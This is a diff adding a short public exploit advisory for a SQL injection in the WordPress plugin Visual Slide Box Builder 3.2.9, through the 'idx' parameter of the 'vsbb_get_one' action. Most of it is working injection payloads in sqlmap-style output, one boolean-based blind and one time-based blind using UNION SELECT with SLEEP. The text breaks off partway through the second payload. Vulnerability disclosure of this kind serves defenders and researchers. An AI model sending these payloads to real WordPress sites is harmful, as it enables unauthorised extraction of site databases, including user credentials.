@@ -1,0 +1,26 @@
+# Title: WordPress Plugin Visual Slide Box Builder 3.2.9 - SQLi
+# Author: nu11secur1ty
+# Date: 07.11.2022
+# Vendor: https://wphive.com/
+# Software: https://wphive.com/plugins/wp-visual-slidebox-builder/?plugin_version=3.2.9
+# Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/WordPress/2022/Visual-Slide-Box-Builder-plugin
+
+## Description:
+The parameter `idx` from the Visual Slide Box Builder plugin app for
+WordPress appears to be vulnerable to SQLi.
+The attacker can receive all database information from the WordPress
+database and he can use it for very malicious purposes.
+
+[+] Payloads:
+
+```mysql
+---
+Parameter: idx (GET)
+    Type: boolean-based blind
+    Title: HAVING boolean-based blind - WHERE, GROUP BY clause
+    Payload: action=vsbb_get_one&idx=1 union select 1,2,3,4,5,sleep(3)
+HAVING 1854=1854
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=vsbb_get_one&idx=1 union sel
